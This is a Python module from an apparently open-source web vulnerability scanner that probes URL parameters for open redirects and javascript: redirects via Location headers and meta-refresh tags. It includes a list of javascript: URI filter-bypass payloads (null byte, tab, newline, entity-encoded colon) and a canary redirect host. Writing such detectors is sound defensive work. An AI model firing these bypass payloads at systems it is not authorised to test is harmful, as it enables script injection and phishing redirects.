# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
# Open redirect and redirect-to-javascript detector.
# Covers header redirects (plain + bypass variants), meta-refresh redirects,
# and open redirect via both Location header and meta-refresh.

from __future__ import annotations

import re
import urllib.parse as up
from typing import List, Optional, Tuple

from ..reporter import OpenRedirectFinding

# ---------------------------------------------------------------------------
# Canary values
# ---------------------------------------------------------------------------
_CANARY_HOST    = "stingxss-canary.example.com"
_CANARY_MARKER  = "stingxss_redir_marker"
_OPEN_REDIR_URL = f"//{_CANARY_HOST}/{_CANARY_MARKER}"

# javascript: payloads — plain and filter-bypass variants
_JS_REDIRECT_PAYLOADS: List[Tuple[str, str]] = [
  # (payload, bypass_label)
  ("javascript:alert(1)",              "plain"),
  ("Javascript:alert(1)",              "capital_j"),
  ("JAVASCRIPT:alert(1)",              "uppercase"),
  ("javascript\t:alert(1)",            "tab_before_colon"),
  ("\x00javascript:alert(1)",          "null_byte_prefix"),
  ("java\nscript:alert(1)",            "newline_in_keyword"),
  (" javascript:alert(1)",             "leading_space"),
  ("%09javascript:alert(1)",           "url_encoded_tab"),
  ("javascript&#58;alert(1)",          "html_entity_colon"),
]

# Regex: meta-refresh with our injected value reflected into content=
_META_REFRESH_RE = re.compile(
  r'<meta[^>]+http-equiv\s*=\s*["\']?refresh["\']?[^>]+content\s*=\s*["\']?\s*\d*\s*;?\s*([^"\'>\s]+)',
  re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def check_url(
  url: str,
  param: str,
  method: str,
  injector,
  base_data: Optional[dict] = None,
) -> List[OpenRedirectFinding]:
  """Probe a single (url, param) surface for open redirect / javascript-redirect."""
  findings: List[OpenRedirectFinding] = []

  # ---- A+C: javascript: header redirect (plain + bypass variants) ----------
  for payload, label in _JS_REDIRECT_PAYLOADS:
    resp = _inject(injector, url, param, method, payload, base_data)
    if resp is None:
      continue

    location = resp.headers.get("Location", "") or resp.headers.get("location", "")

    if resp.status_code in (301, 302, 303, 307, 308) and _is_js_location(location):
      findings.append(OpenRedirectFinding(
        url=url,
        parameter=param,
        method=method,
        issue="javascript_redirect",
        payload=payload,
        location=location,
        reason=(
          f"Parameter '{param}' is reflected unfiltered into the HTTP Location "
          f"header as a javascript: URI (bypass variant: {label}).  A browser "
          "following this redirect will execute the JavaScript payload in the "
          "context of the redirecting origin."
        ),
      ))
      break  # one JS redirect finding per param is enough

    # Also check meta-refresh body for javascript: URI
    meta_url = _extract_meta_refresh_url(resp.text)
    if meta_url and _is_js_location(meta_url) and _CANARY_MARKER not in meta_url:
      findings.append(OpenRedirectFinding(
        url=url,
        parameter=param,
        method=method,
        issue="meta_redirect",
        payload=payload,
        location=meta_url,
        reason=(
          f"Parameter '{param}' is reflected into a <meta http-equiv=refresh> "
          "tag as a javascript: URI.  Some browsers execute this as JavaScript "
          "when the meta-refresh fires."
        ),
      ))
      break

  # ---- B: open redirect (header) -------------------------------------------
  resp = _inject(injector, url, param, method, _OPEN_REDIR_URL, base_data)
  if resp is not None:
    location = resp.headers.get("Location", "") or resp.headers.get("location", "")
    if resp.status_code in (301, 302, 303, 307, 308) and _CANARY_MARKER in location:
      findings.append(OpenRedirectFinding(
        url=url,
        parameter=param,
        method=method,
        issue="open_redirect",
        payload=_OPEN_REDIR_URL,
        location=location,
        reason=(
          f"Parameter '{param}' is reflected verbatim into the HTTP Location "
          "header.  An attacker can redirect victims to an arbitrary external "
          "URL, enabling phishing, credential theft, and OAuth token hijacking."
        ),
      ))

    # Open redirect via meta-refresh
    meta_url = _extract_meta_refresh_url(resp.text)
    if meta_url and _CANARY_MARKER in meta_url:
      findings.append(OpenRedirectFinding(
        url=url,
        parameter=param,
        method=method,
        issue="meta_redirect_open",
        payload=_OPEN_REDIR_URL,
        location=meta_url,
        reason=(
          f"Parameter '{param}' is reflected into a <meta http-equiv=refresh> "
          "tag as an external URL.  An attacker can redirect victims to an "
          "arbitrary external URL via the meta-refresh mechanism."
        ),
      ))

  return findings


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _inject(injector, url, param, method, payload, base_data):
  """Inject payload and return the response (no redirect-following)."""
  try:
    parsed    = up.urlparse(url)
    qs        = up.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_qs    = up.urlencode(qs, doseq=True)
    target    = up.urlunparse(parsed._replace(query=new_qs))
    return injector.get(target, allow_redirects=False)
  except Exception:
    return None


def _is_js_location(value: str) -> bool:
  """True if the Location/URL value is a javascript: URI (any case, with common bypasses)."""
  stripped = value.strip().lstrip("\x00").lstrip(" \t\n\r")
  return re.match(r'javascript\s*:', stripped, re.IGNORECASE) is not None


def _extract_meta_refresh_url(body: str) -> Optional[str]:
  """Return the URL from a <meta http-equiv=refresh content="N;URL"> tag, or None."""
  m = _META_REFRESH_RE.search(body)
  if m:
    return m.group(1).strip()
  # Also try simpler form: content="0;url=..."
  m2 = re.search(
    r'<meta[^>]+content\s*=\s*["\']?\s*\d+\s*;\s*(?:url\s*=\s*)?([^"\'>\s]+)',
    body, re.IGNORECASE,
  )
  if m2:
    return m2.group(1).strip()
  return None
